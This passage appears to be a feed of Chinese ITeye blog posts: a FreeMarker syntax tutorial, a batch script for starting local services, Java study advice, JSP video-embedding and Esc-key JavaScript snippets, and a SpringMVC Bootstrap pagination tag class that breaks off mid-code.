用例 字符串 <#switch being.size>   <#case "small">      This will be processed if it is small      <#break>   <#case "medium">      This will be processed if it is medium      <#break>   <#case "large">      This will be processed if it is large      <#break>   <#default>      This will be processed if it is neither </#switch> 数字 <#switch x>   <#case x = 1>     1   <#case x = 2>     2   <#default>     d </#switch>
如果x=1 输出 1 2, x=2输出 2, x=3 输出d
list, break 语法 <#list sequence as item> ... <#if item = "spring"><#break></#if> ... </#list> 关键字 item_index:是list当前值的下标 item_has_next:判断list是否还有值
用例 <#assign seq = ["winter", "spring", "summer", "autumn"]> <#list seq as x>   ${x_index + 1}. ${x}<#if x_has_next>,</#if> </#list>
输出   1. winter,   2. spring,   3. summer,   4. autumn 
include 语法 <#include filename> or <#include filename options> options包含两个属性 encoding=”GBK” 编码格式 parse=true 是否作为ftl语法解析,默认是true，false就是以文本方式引入.注意在ftl文件里布尔值都是直接赋值的如parse=true,而不是parse=”true” 用例 /common/copyright.ftl包含内容 Copyright 2001-2002 ${me}<br> All rights reserved. 模板文件 <#assign me = "Juila Smith"> <h1>Some test</h1> <p>Yeah. <hr> <#include "/common/copyright.ftl" encoding=”GBK”> 输出结果 <h1>Some test</h1> <p>Yeah. <hr> Copyright 2001-2002 Juila Smith All rights reserved.
Import 语法 <#import path as hash> 类似于java里的import,它导入文件，然后就可以在当前文件里使用被导入文件里的宏组件
用例
假设mylib.ftl里定义了宏copyright那么我们在其他模板页面里可以这样使用 <#import "/libs/mylib.ftl" as my>
<@my.copyright date="1999-2002"/>
"my"在freemarker里被称作namespace
compress 语法 <#compress>   ... </#compress> 用来压缩空白空间和空白的行 用例 <#assign x = "    moo  \n\n   "> (<#compress>   1 2  3   4    5   ${moo}   test only
  I said, test only
</#compress>) 输出 (1 2 3 4 5 moo test only I said, test only) escape, noescape 语法 <#escape identifier as expression>   ...   <#noescape>...</#noescape>   ... </#escape> 用例 主要使用在相似的字符串变量输出，比如某一个模块的所有字符串输出都必须是html安全的，这个时候就可以使用该表达式 <#escape x as x?html>   First name: ${firstName}   <#noescape>Last name: ${lastName}</#noescape>   Maiden name: ${maidenName} </#escape> 相同表达式   First name: ${firstName?html}   Last name: ${lastName }   Maiden name: ${maidenName?html} assign 语法 <#assign name=value> or <#assign name1=value1 name2=value2 ... nameN=valueN> or <#assign same as above... in namespacehash> or <#assign name>   capture this </#assign> or <#assign name in namespacehash>   capture this </#assign> 用例 生成变量,并且给变量赋值 给seasons赋予序列值 <#assign seasons = ["winter", "spring", "summer", "autumn"]>
给变量test加1 <#assign test = test + 1>
给my namespage 赋予一个变量bgColor,下面可以通过my.bgColor来访问这个变量 <#import "/mylib.ftl" as my> <#assign bgColor="red" in my>
将一段输出的文本作为变量保存在x里 下面的阴影部分输出的文本将被赋值给x <#assign x>   <#list 1..3 as n>     ${n} <@myMacro />   </#list> </#assign> Number of words: ${x?word_list?size} ${x}
<#assign x>Hello ${user}!</#assign>     error <#assign x=” Hello ${user}!”>         true
同时也支持中文赋值，如： <#assign 语法>   java </#assign> ${语法} 打印输出: java global 语法 <#global name=value> or <#global name1=value1 name2=value2 ... nameN=valueN> or <#global name>   capture this </#global>
全局赋值语法，利用这个语法给变量赋值，那么这个变量在所有的namespace中是可见的,如果这个变量被当前的assign语法覆盖如<#global x=2> <#assign x=1> 在当前页面里x=2将被隐藏，或者通过${.global.x}来访问
setting 语法 <#setting name=value> 用来设置整个系统的一个环境 locale number_format boolean_format date_format, time_format, datetime_format time_zone classic_compatible 用例 假如当前是匈牙利的设置，然后修改成美国 ${1.2} <#setting locale="en_US"> ${1.2} 输出 1,2 1.2 因为匈牙利是采用“,”作为十进制的分隔符，美国是用“.”
 
macro, nested, return 语法
<#macro name param1 param2 ... paramN>   ...   <#nested loopvar1, loopvar2, ..., loopvarN>   ...   <#return>   ... </#macro> 用例 <#macro test foo bar="Bar" baaz=-1>   Test text, and the params: ${foo}, ${bar}, ${baaz} </#macro> <@test foo="a" bar="b" baaz=5*5-2/> <@test foo="a" bar="b"/> <@test foo="a" baaz=5*5-2/> <@test foo="a"/> 输出   Test text, and the params: a, b, 23   Test text, and the params: a, b, -1   Test text, and the params: a, Bar, 23   Test text, and the params: a, Bar, -1 定义循环输出的宏 <#macro list title items>   <p>${title?cap_first}:   <ul>     <#list items as x>       <li>${x?cap_first}     </#list>   </ul> </#macro> <@list items=["mouse", "elephant", "python"] title="Animals"/> 输出结果 <p>Animals:   <ul>       <li>Mouse       <li>Elephant       <li>Python   </ul> 包含body的宏 <#macro repeat count>   <#list 1..count as x>     <#nested x, x/2, x==count>   </#list> </#macro> <@repeat count=4 ; c halfc last>   ${c}. ${halfc}<#if last> Last!</#if> </@repeat> 输出 1. 0.5   2. 1   3. 1.5   4. 2 Last!
 
t, lt, rt 语法 <#t> 去掉左右空白和回车换行
<#lt>去掉左边空白和回车换行
<#rt>去掉右边空白和回车换行
<#nt>取消上面的效果
3一些常用方法或注意事项
表达式转换类 ${expression}计算expression并输出 #{ expression }数字计算#{ expression ;format}安格式输出数字format为M和m M表示小数点后最多的位数,m表示小数点后最少的位数如#{121.2322;m2M2}输出121.23
 
数字循环 1..5 表示从1到5，原型number..number 对浮点取整数 ${123.23?int} 输出123 给变量默认值 ${var?default(“hello world<br>”)?html}如果var is null那么将会被hello world<br>替代
判断对象是不是null     <#if mouse?exists>       Mouse found <#else> 也可以直接${mouse?if_exists})输出布尔形 常用格式化日期 openingTime必须是Date型,详细查看freemarker文档 Reference->build-in referece->build-in for date
${openingTime?date} ${openingTime?date_time} ${openingTime?time}
添加全局共享变量数据模型 在代码里的实现     cfg = Configuration.getDefaultConfiguration(); cfg.setSharedVariable("global", "you good"); 页面实现可以通过global指令,具体查看指令里的global部分 直接调用java对象的方法 ${object.methed(args)}
字符串处理(内置方法) html安全输出 “abc<table>sdfsf”?html 返回安全的html输出,替换掉html代码 xml安全输出 var?xml  substring的用法 <#assign user=”hello jeen”> ${user[0]}${user[4]} ${user[1..4]} 输出 : ho ello 类似String.split的用法 “abc;def;ghi”?split(“;”)返回sequence 将字符串按空格转化成sequence,然后取sequence的长度      var?word_list  效果同 var?split(“ ”) var?word_list?size
取得字符串长度 var?length
大写输出字符 var?upper_case
小写输出字符 var?lower_case
首字符大写 var?cap_first
首字符小写 var?uncap_first
去掉字符串前后空格 var?trim
每个单词的首字符大写 var?capitalize
类似String.indexof: “babcdabcd”?index_of(“abc”) 返回1 “babcdabcd”?index_of(“abc”,2) 返回5 类似String.lastIndexOf last_index_of和String.lastIndexOf类似,同上
下面两个可能在代码生成的时候使用（在引号前加”\”） j_string: 在字符串引号前加”\” <#assign beanName = 'The "foo" bean.'> String BEAN_NAME = "${beanName?j_string}"; 打印输出: String BEAN_NAME = "The \"foo\" bean."; js_string: <#assign user = "Big Joe's \"right hand\"."> <script>   alert("Welcome ${user}!"); </script> 打印输出 alert("Welcome Big Joe\'s \"right hand\"!");
替换字符串 replace ${s?replace(‘ba’, ‘XY’ )} ${s?replace(‘ba’, ‘XY’ , ‘规则参数’)}将s里的所有的ba替换成xy 规则参数包含: i r m s c f 具体含义如下: · i: 大小写不区分. · f: 只替换第一个出现被替换字符串的字符串 · r:  XY是正则表达式 · m: Multi-line mode for regular expressions. In multi-line mode the expressions ^ and $ match just after or just before, respectively, a line terminator or the end of the string. By default these expressions only match at the beginning and the end of the entire string. · s: Enables dotall mode for regular expressions (same as Perl singe-line mode). In dotall mode, the expression . matches any character, including a line terminator. By default this expression does not match line terminators.· c: Permits whitespace and comments in regular expressions.
在模板里对sequences和hashes初始化 sequences
1. [“you”,”me”,”he”] 2. 1..100 3. [ {“Akey”:”Avalue”},{“Akey1”:”Avalue1”}, {“Bkey”:”Bvalue”},{“Bkey1”:”Bvalue1”}, ]
hashes      {“you”:”a”,”me”:”b”,”he”:”c”}
注释标志 <#-- 这里是注释 --> 旧版本的freemarker采用的是<#comment> 注释 </#comment>方法
sequences内置方法 sequence?first 返回sequence的第一个值;前提条件sequence不能是null sequence?last 返回sequence最后一个值 sequence?reverse 反转sequence的值 sequence?size 返回sequence的大小 sequence?sort 对sequence按里面的对象toString()的结果进行排序 sequence?sort_by(value) 对sequence 按里面的对象的属性value进行排序 如: sequence里面放入的是10 个user对象，user对象里面包含name,age等属性 sequence?sort_by(name) 表示所有的user按user.name进行排序 hashes内置方法 hash?keys 返回hash里的所有keys, 返回结果类型sequence hash?values 返回hash里的所有value, 返回结果类型sequence 4 freemarker在web开发中注意事项 freemarker与webwork整合 web中常用的几个对象 Freemarker的ftl文件中直接使用内部对象: ${Request ["a"]} ${RequestParameters["a"]} ${Session ["a"]} ${Application ["a"]} ${JspTaglibs ["a"]}
与webwork整合之后 通过配置的servlet 已经把request,session等对象置入了数据模型中 在view中存在下面的对象   我们可以在ftl中${req}来打印req对象 · req - the current HttpServletRequest · res - the current HttpServletResponse · stack - the current OgnlValueStack · ognl - the OgnlTool instance · webwork - an instance of FreemarkerWebWorkUtil · action - the current WebWork action · exception - optional the Exception instance, if the view is a JSP exception or Servlet exception view view中值的搜索顺序 ${name}将会以下面的顺序查找name值 · freemarker variables · value stack · request attributes · session attributes · servlet context attributes 在模板里ftl里使用标签 注意，如果标签的属性值是数字，那么必须采用nubmer=123方式给属性赋值 JSP页面 <%@page contentType="text/html;charset=ISO-8859-2" language="java"%> <%@taglib uri="/WEB-INF/struts-html.tld" prefix="html"%> <%@taglib uri="/WEB-INF/struts-bean.tld" prefix="bean"%>
<html>   <body>     <h1><bean:message key="welcome.title"/></h1>     <html:errors/>     <html:form action="/query">       Keyword: <html:text property="keyword"/><br>       Exclude: <html:text property="exclude"/><br>       <html:submit value="Send"/>     </html:form>   </body> </html> 模板ftl页面 <#assign html=JspTaglibs["/WEB-INF/struts-html.tld"]> <#assign bean=JspTaglibs["/WEB-INF/struts-bean.tld"]>
<html>   <body>     <h1><@bean.message key="welcome.title"/></h1>     <@html.errors/>     <@html.form action="/query">       Keyword: <@html.text property="keyword"/><br>       Exclude: <@html.text property="exclude"/><br>       <@html.submit value="Send"/>     </@html.form>   </body> </html>
如何初始化共享变量 1． 初始化全局共享数据模型 freemark在web上使用的时候对共享数据的初始化支持的不够,不能在配置初始化的时候实现，而必须通过ftl文件来初始化全局变量。这是不能满主需求的，我们需要在servlet init的时候留出一个接口来初始化系统的共享数据 具体到和webwork整合,因为本身webwork提供了整合servlet,如果要增加全局共享变量，可以通过修改 com.opensymphony.webwork.views.freemarker.FreemarkerServlet来实现,我们可以在这个 servlet初始化的时候来初始化全局共享变量 与webwork整合配置 配置web.xml <servlet>     <servlet-name>freemarker</servlet-name>     <servlet-class>com.opensymphony.webwork.views.freemarker.FreemarkerServlet</servlet-class>     <init-param>       <param-name>TemplatePath</param-name> <param-value>/</param-value> <!—模板载入文件夹，这里相对context root，递归获取该文件夹下的所有模板-->     </init-param>     <init-param>       <param-name>NoCache</param-name> <!—是否对模板缓存-->       <param-value>true</param-value>     </init-param>     <init-param>       <param-name>ContentType</param-name>       <param-value>text/html</param-value>     </init-param>     <init-param> <param-name>template_update_delay</param-name> <!—模板更新时间,0表示每次都更新,这个适合开发时候-->       <param-value>0</param-value>     </init-param>     <init-param>       <param-name>default_encoding</param-name>       <param-value>GBK</param-value>     </init-param>     <init-param>       <param-name>number_format</param-name>       <param-value>0.##########</param-value><!—数字显示格式-->     </init-param>     <load-on-startup>1</load-on-startup>   </servlet>   <servlet-mapping>     <servlet-name>freemarker</servlet-name>     <url-pattern>*.ftl</url-pattern>   </servlet-mapping>
5高级方法 自定义方法 ${timer("yyyy-MM-dd H:mm:ss", x)} ${timer("yyyy-MM-dd ", x)}
在模板中除了可以通过对象来调用方法外（${object.methed(args)}）也可以直接调用java实现的方法，java类必须实现接口TemplateMethodModel的方法exec(List args). 下面以把毫秒的时间转换成按格式输出的时间为例子 public class LongToDate implements TemplateMethodModel {    public TemplateModel exec(List args) throws TemplateModelException { SimpleDateFormat mydate = new SimpleDateFormat((String) args.get(0)));         return mydate.format(new Date(Long.parseLong((String)args.get(1)));     } } 将LongToDate对象放入到数据模型中 root.put("timer", new IndexOfMethod()); ftl模板里使用 <#assign x = "123112455445"> ${timer("yyyy-MM-dd H:mm:ss", x)} ${timer("yyyy-MM-dd ", x)}
输出 2001-10-12 5:21:12 2001-10-12
自定义 Transforms 实现自定义的<@transform>文本或表达式</@transform>的功能,允许对中间的最终文本进行解析转换
例子：实现<@upcase>str</@upcase> 将str转换成STR 的功能
代码如下： import java.io.*; import java.util.*; import freemarker.template.TemplateTransformModel;
class UpperCaseTransform implements TemplateTransformModel {
    public Writer getWriter(Writer out, Map args) {         return new UpperCaseWriter(out);     }
    private class UpperCaseWriter extends Writer {               private Writer out;                   UpperCaseWriter (Writer out) {             this.out = out;         }
        public void write(char[] cbuf, int off, int len)                 throws IOException {             out.write(new String(cbuf, off, len).toUpperCase());         }
        public void flush() throws IOException {             out.flush();         }
        public void close() {         }     } } 然后将此对象put到数据模型中 root.put("upcase", new UpperCaseTransform());
在view(ftl)页面中可以如下方式使用
<@upcase> hello world </@upcase>
打印输出: HELLO WORLD
    本文附件下载:
    
      FreeMarker_Manual_zh_CN.pdf (2.3 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
开发人员常用的脚本启动工具, zz563143188.iteye.com.blog.1896762, Mon, 01 Jul 2013 08:49:48 +0800
   平时工作中经常需要启动一些服务，每次从选择到开启都是繁琐又重复的工作。今天分享一些脚本，开启关闭服务器，一键打开我们常用的软件操作。 
color 2
@echo off
@rem bat command
SETLOCAL
title 欢迎启动你需要的服务
rem 一个处理命令的开关，可以根据选择进行服务命令处理
echo "环境变量查看"
PATH
echo  JAVA-HOME位置 "%JAVA_HOME%"
echo  maven项目位置 "%maven_home%"
echo  tomcat目录    "%CATALINA_HOME%"
:begin
echo  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
echo  ▓ 1    ▓启动sql数据库服务                                       ▓
echo  ▓ 2    ▓启动mysql数据库服务                                     ▓
echo  ▓ 3    ▓启动oracle数据库服务                                    ▓
echo  ▓ 4    ▓启动tomcat服务器                                        ▓
echo  ▓ 5    ▓启动weblogic服务                                        ▓
echo  ▓ 6    ▓启动myeclipse                                           ▓
echo  ▓ 7    ▓停止sql数据库服务                                       ▓
echo  ▓ 8    ▓停止mysql数据库服务                                     ▓
echo  ▓ 9    ▓停止oracle数据库服务                                    ▓
echo  ▓ 10   ▓启动版本控制服务                                        ▓
echo  ▓ 11   ▓退出                                                    ▓
echo  ▓ 12   ▓初始动作                                                ▓
echo  ▓ 13   ▓启动数据库                                              ▓
echo  ▓ 14   ▓关闭数据库                                              ▓
echo  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
echo .
set isGoTo=true rem 设置一个变量控制是否启动多个服务
set /p menunr=请根据数字选择你需要的服务 ：
IF %menunr%==1 (goto startSql)
IF %menunr%==2 (goto StartMysql)
IF %menunr%==3 (goto StartOracle)
IF %menunr%==4 (goto tomcat)
IF %menunr%==5 (goto weblogic)
IF %menunr%==6 (goto myeclipse)
IF %menunr%==7 (goto stopSql)
IF %menunr%==8 (goto stopMysql)
IF %menunr%==9 (goto stopOralce)
IF %menunr%==10 (goto svn)
IF %menunr%==11 (goto exit)
IF %menunr%==12 (goto init)
IF %menunr%==13 (goto start)
IF %menunr%==14 (goto stop)
:start
set isGoTo=false
call :startSql
goto begin
:stop
set isGoTo=false
call :stopSql
goto begin
:init
rem 这里是启动平时常用程序
C:
cd \Program Files\Tencent\QQ\QQProtect\Bin\
start QQProtect.exe
cd  \Program Files\Evernote\Evernote\
start Evernote.exe
cd  \Documents and Settings\Administrator\Application Data\360se6\Application\
start 360se.exe
explorer E:\workspace
:startSql
rem 启动sql数据库
  net start mssqlserver
  echo "sql数据库服务已启动" 
  if %isGoTo%==true   goto begin
:startMysql
rem 启动mysql数据库
   net start mysql
  echo "mysql数据库服务已启动"
  if %isGoTo%==true   goto begin
:startOracle
  net start OracleMTSRecoveryService
  net start OracleDbConsoleorcl
  net start OracleServiceORCL
  net start OracleOraDb11g_home1TNSListener
  echo "oracle数据库服务已启动"
  set isGoTo=true
  goto begin
 
:tomcat
   E:
   cd  \workspace\apache-tomcat-7.0.40\bin\
   start  startup.bat
   echo tomcat服务器启动成功
   goto begin
:weblogic
   E:
   cd   \bea\user_projects\domains\base_domain\
   start  startWebLogic.cmd
   echo tomcat服务器启动成功
   goto begin
:myeclipse
    C:
    cd  \Program Files\Genuitec\MyEclipse 8.5\
    start myeclipse.exe
   echo myeclipse服务器启动成功
   goto begin
:stopSql
  net stop mssqlserver
  echo "sql数据库服务已停止"
  if %isGoTo%==true   goto begin
  
:stopMysql
  net stop mysql
  echo "mysql数据库服务已停止"
  if %isGoTo%==true   goto begin
 
:stopOralce
  net  stop OracleMTSRecoveryService
  net  stop OracleDbConsoleorcl
  net  stop OracleServiceORCL
  net  stop OracleOraDb11g_home1TNSListener
  echo "oracle数据库服务已停止" 
  set isGoTo=true
  goto begin
:svn
  cls
  echo "版本控制服务端运行......"
  svnserve -d -r E:\workspace\repository
 
:exit
  pause>nul
:toTomatDir
ENDLOCAL
  企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168  收集五年的开发资料下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java自学者的福音, zz563143188.iteye.com.blog.1896597, Sun, 30 Jun 2013 12:35:00 +0800

 
       谈到自学对于程序员来说并不陌生，自从我们离开校门就开始了自学之路。这一路上绝大部分都是百步止于九十步， 不是因为他们不够坚持，而是没有找到学习的方法和资源。当然这一路上我也走得很辛苦，刚毕业后自学让我很迷茫很累，面对浩如烟海的学习资料无法选择，如果 一一过目筛选太耗时间也没有效率。毕竟程序都是很忙很累，还要花时间谈恋爱还要结交朋友等等。通过几年的摸索和积累总结了一些学习经验，今天就为大家分享 一些资料。
 
1.对于PDF文档的资料，有些只是适合我们查问，有些则需要我们细细研读重复读来掌握
2.对于视频教程就看我们需要那一块就认真听，然后记录下重要的知识点，也就可以截图方式截下来保存重复加快。
3.对于查看api,sdk这个不用我说，你们都懂。
 
 
 
随 着网络的流行，给了我们自学的条件。当然自学不是盲目的，不是看到什么就学什么，不是对什么感兴趣就学什么，而是学我们工作真正需要的知识。对于软件IT 行业来说，有浩如烟海的书籍和资料，让自学者盲目头疼。一开始我也是这样的，经过几年的磨合我才明白，自学一开始并需要看太浮华的书籍。万丈高楼平地起先 把基础知识搞扎实，再熟悉框架方面知识，再到设计模式，UMl模型。 个人建议学习路线
 1.java编程思想第三版，第四版学习。（反射，动态代理，容器，并发）重点掌握，网络如果以后从事网络载发可以重点掌握
 2.韩顺平讲的 J2SE基础知识 (选择性的重复看需要的知识)
3. 韩顺平oracle数据库
3.张孝详讲的 j2SE 高深技术（对于java需要深入了解） 4.马士兵讲的 struts,spring,hibernate视频（框架的基础） 5.马士兵讲的 设计模式,uml（开始设计的高度） 6.maven,svn,nexus（开始项目管理的高度） 7.至于 ext,jquery,ext,javascript.....教程根据需要选学
 
以上内容只是个人看法和见解，仅供参考，
以上提到的PDF及视频教程下载地址：
企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168
以上提到的视频资料及图片显示内容下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
   
 
已有 39 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
今天看到IT女标配 程序媛躺着也中枪、, zz563143188.iteye.com.blog.1889439, Wed, 19 Jun 2013 20:45:35 +0800

  如今IT女在众人眼中已有女神形象，看看这张图片感叹一下。
1：我不觉得我是无焦点眼神，再说戴着眼镜也看不到眼神究竟有木有焦点2：我头发不长 不需要扎起来，以前长头发时照样整天扎起马尾啊3：hello world 是什么歌？
4. 我是有戴眼镜，不过只是看对着电脑的时候，平时要么不带要么隐形。5. 我不玩微信，扣扣电脑上挂着呢，手机上就不用了，至于微博，只是无聊的时候消遣罢了。6. 身份识别猫牌，貌似没有7. 我可没有这个百宝袋，不过蛮想要的。
8. 电脑挎包，出上班不需要带自己的电脑吧？逛街更不用了~9. 我的衣服虽然暗色的居多，但不是因为是IT女的原因，而是姐姐想遮肉~10. 表示我不吃这个东东11. 我现在身上穿的就是长裙。哈哈。
 
 
 
 
企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168
 
以下图片显示的资料下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
如何实现在jsp页面中播放高清视频, jilongliang.iteye.com.blog.2064200, Fri, 09 May 2014 10:31:39 +0800

通过html中的<Object>和<embed>来实现
<object id="mPlayer1" width=300 height=300classid="CLSID:6BF52A52-394A-11D3-B153-00C04F79FAA6">
<param name="URL" value="<%=url%>">
<param name="rate" value="1">
<!--播放速率控制,1为正常,允许小数 -->
<param name="balance" value="0">
<!--左右声道平衡,最左-9640,最右9640 -->
<param name="currentPosition" value="0">
<!--当前播放进度 -1 表示不变,0表示开头 单位是秒,比如10表示从第10秒处开始播放,值必须是-1.0或大于等于0-->
<param name="defaultFrame" value>
<param name="playCount" value="100">
<!--重复播放次数,0为始终重复-->
<param name="autoStart" value="1">
<!--是否自动播放-->
<param name="currentMarker" value="0">
<param name="invokeURLs" value="1">
<param name="baseURL" value>
<param name="volume" value="100">
<!--音量大小,负值表示是当前音量的减值,值自动会取绝对值,最大为0,最小为-9640-->
<param name="mute" value="0">
<!--是否静音-->
<param name="uiMode" value="full">
<param name="stretchToFit" value="0">
<param name="windowlessVideo" value="0">
<!--如果是0可以允许全屏,否则只能在窗口中查看-->
<param name="enabled" value="1">
<param name="enableContextMenu" value="1">
<!--是否用右键弹出菜单控制-->
<param name="fullScreen" value="0">
<param name="SAMIStyle" value>
<!--SAMI样式-->
<param name="SAMILang" value>
<!--SAMI语言-->
<param name="SAMIFilename" value>
<!--字幕ID-->
<param name="captioningID" value>
<param name="enableErrorDialogs" value="0">
<param name="_cx" value="7779">
<param name="_cy" value="1693">
</object>
里面的URL是你视频的地址
 
 
 <object id="MediaPlayer" width="250" height="200" classid="CLSID:22D6F312-B0F6-11D0-94AB-0080C74C7E95" 
			standby="Loading Windows Media Player components..." type="application/x-oleobject">  
			<param name="FileName" value="路径" />  
		   <param name="ShowControls" value="false" />  
		   <param name="ShowStatusBar" value="false" />  
		   <param name="ShowDisplay" value="false" />  
		   <param name="autostart" value="true" />  
		   <param name="loop" value="50"  />
		   <embed type ="application/x-mplayer2" src="路径" name="MediaPlayer" 
			 width="250" height="200" ShowControls="false" autoplay="true" playcount="50" repeat="50" autostart="true" loop="50">
		   </embed>  
 </object>    
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Esc建实现关闭窗体, jilongliang.iteye.com.blog.2063627, Thu, 08 May 2014 11:17:36 +0800

MyHtml.html
<script type="text/javascript" language="javascript">// <![CDATA[
	function esckeydown()
	{
		if(event.keyCode==27){
		   event.returnValue = null;
		   window.returnValue = null;
		   window.close();
		}
	}
	//document.onkeydown=esckeydown;
	
	
	function esckeydownHide()
	{
		if(event.keyCode==27){
			
			document.getElementById('test').style.display='none';
		}
	}
	document.onkeydown=esckeydownHide;
	function test(){
		document.getElementById('test').style.display='block';
	}
// ]]></script>aaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaa aaaaaaaaaaaaaa aaaaaaaaaaaaaa aaaaaaaaaaaaaa
test
<!DOCTYPE html>
<html>
  <head>
    <title>MyHtml.html</title>
	
    <meta name="keywords" content="keyword1,keyword2,keyword3">
    <meta name="description" content="this is my page">
    <meta name="content-type" content="text/html; charset=UTF-8">
    
  <script language="javascript">
	function esckeydown()
	{
		if(event.keyCode==27){
		   event.returnValue = null;
		   window.returnValue = null;
		   window.close();
		}
	}
	//document.onkeydown=esckeydown;
	
	
	function esckeydownHide()
	{
		if(event.keyCode==27){
			
			document.getElementById('test').style.display='none';
		}
	}
	document.onkeydown=esckeydownHide;
	function test(){
		document.getElementById('test').style.display='block';
	}
</script>
  </head>
  
  <body>
   	<div style="height: 200px;width: 200px;display:none" id="test">
   	aaaaaaaaaaaaaaaaaaaaaaaaaaaa
   	aaaaaaaaaaaaaa
   	aaaaaaaaaaaaaa
   	aaaaaaaaaaaaaa
   	aaaaaaaaaaaaaa
   	</div>
   	
   	<a href="javascript:void(0);" onclick="test()">test</a>
  </body>
</html>
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
使用SpringMVC+hibernate实现Bootstrap分页, jilongliang.iteye.com.blog.2062068, Tue, 06 May 2014 14:00:10 +0800

package com.org.utils.taglib;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import javax.servlet.jsp.JspException;
import javax.servlet.jsp.tagext.SimpleTagSupport;
public class PageTag extends SimpleTagSupport {
	// 提交URL的一个约定的格式: pageSerlvet?pageIndex={0}
	private static final String TEG = "{0}";
	private String parms;
	// 当前页数
	private int pageIndex;
	// 一页显示的数量
	private int pageSize;
	// 记录总条数
	private int recordCount;
	// 提交的URL
	private String submitUrl;
	// 定义总共的页数
	private int pageCount;
	
	//每页显示的实际数量
	private int  pageRealSize;
	public int getPageRealSize() {
		return pageRealSize;
	}
	public void setPageRealSize(int pageRealSize) {
		this.pageRealSize = pageRealSize;
	}
	/**
	 * Pre前一页
	 * Next下一页
	 * &laquo;向←左left
	 * &raquo;向→右right
	 * 
	 */
	public void doTag() throws JspException, IOException {
		StringBuilder pageWrapStr = new StringBuilder();
		StringBuffer  pageNumberStr = new StringBuffer();
		if(parms==null || parms.isEmpty() || parms.trim().length()==0){
			
		}else{
			submitUrl+="&"+this.getParms();
		}
		
		// 先判断记录总条数
		if (recordCount > 0) {
			// 计算出总共的页数
			pageCount = (recordCount % pageSize == 0) ? (recordCount / pageSize)
					: (recordCount / pageSize) + 1;
			// 判断总页数与当前页数的关系
			pageIndex = (pageIndex >= pageCount) ? pageCount : pageIndex;
			
			//计算该页实际显示记录数
			if(pageIndex<pageCount){
				pageRealSize=pageSize;
			}else{
				pageRealSize=recordCount-pageSize*(pageIndex-1);
			}
			
			pageWrapStr.append(" <div class='page-number-strip' style='height:62px;'> ");//page-number-strip
			
			// 确定上一页与下页是否加链接
			String tempUrl1 = submitUrl.replace(TEG, String.valueOf(1));
			pageNumberStr.append("<ul class='pagination'>");//添加boostrap分页样式
			
			pageNumberStr.append("<li><a href='" + tempUrl1 + "'>&laquo;</a> </li>");
			if (pageIndex == 1) { // 当前页数为第一页时
				pageNumberStr.append("<li><span>Pre</span> </li>"); // 头
				// 中间
				calculatePage(pageNumberStr);
				// 尾
				if (pageCount == 1) {
					pageNumberStr.append("<li><span>Next</span> </li>");
				} else {
					String tempUrl = submitUrl.replace(TEG,String.valueOf(pageIndex + 1));
					pageNumberStr.append("<li><a href='" + tempUrl + "'>Next</a> </li>");
				}
			} else if (pageIndex == pageCount) { // 当前页数为最后一页时
				String tempUrl = submitUrl.replace(TEG, String.valueOf(pageIndex - 1));
				pageNumberStr.append("<li><a href='" + tempUrl + "'>Pre</a> </li>");
				// 中间
				calculatePage(pageNumberStr);
				// 最后一页
				pageNumberStr.append("<li><span>Next</span>");
			} else { // 当前页数为中间时
				String tempUrl = submitUrl.replace(TEG, String.valueOf(pageIndex - 1));
				pageNumberStr.append("<li><a href='" + tempUrl + "'>Pre</a> </li>");
				// 中间
				calculatePage(pageNumberStr);
				// 尾
				tempUrl = submitUrl.replace(TEG, String.valueOf(pageIndex + 1));
				pageNumberStr.append("<li><a href='" + tempUrl + "'>Next</a> </li>");
			}
			String tempUrl2 = submitUrl.replace(TEG, String.valueOf(pageCount));
			pageNumberStr.append("<li><a href='" + tempUrl2 + "'>&raquo;</a> </li>");
			pageNumberStr.append("<li>&nbsp;&nbsp;跳到<input type='text' id='page_number_id' size='1' value='"+pageIndex+"' sytle='margin-top:5px;'/>页&nbsp;&nbsp;</li>");
			pageNumberStr.append("<li><a>" + pageRealSize + "/" + recordCount + "items &nbsp;of &nbsp;p" + pageCount + "&nbsp;</a></li>");
			pageNumberStr.append("<li><input type='button' value='确定' class='btn-page-confirm' style='color:#fff'  onclick='doJumpPage();'/></li>");
			pageNumberStr.append("</ul>");
			
			// 加上跳转信息\显示信息
			pageWrapStr.append(pageNumberStr.toString());
			
			pageWrapStr.append(" </div> ");
			
			
			// 第二行拼接分页提示信息/ 计算出显录的开始记录条数与结束的记录条数
			int startNum = (pageIndex - 1) * pageSize + 1;
			int endNum = (pageIndex == pageCount) ? recordCount : pageIndex * pageSize;
			// 最后拼接JavaScript代码
			pageWrapStr.append("<script type=\"text/javascript\">");
		
			
			pageWrapStr.append("var doJumpPage = function(){");
			pageWrapStr.append("var pageCount = " + pageCount + ";");
			pageWrapStr.append("var url = '" + submitUrl + "';");
			pageWrapStr.append("var regu='^[0-9]+$'; var re=new RegExp(regu);");
			pageWrapStr.append("var num = document.getElementById('page_number_id').value;");
			pageWrapStr.append("if(num.search(re)==-1){alert('请输入整数！'); return false}");
